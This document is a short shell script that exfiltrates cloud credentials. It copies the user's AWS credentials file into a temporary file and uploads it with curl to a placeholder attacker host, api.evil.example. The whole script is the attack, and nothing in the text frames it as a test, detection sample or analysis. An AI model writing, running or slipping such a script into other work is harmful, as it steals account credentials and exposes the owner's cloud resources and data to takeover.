#!/bin/sh
cat ~/.aws/credentials > /tmp/stage.txt
sleep 1
curl -T /tmp/stage.txt https://api.evil.example/upload
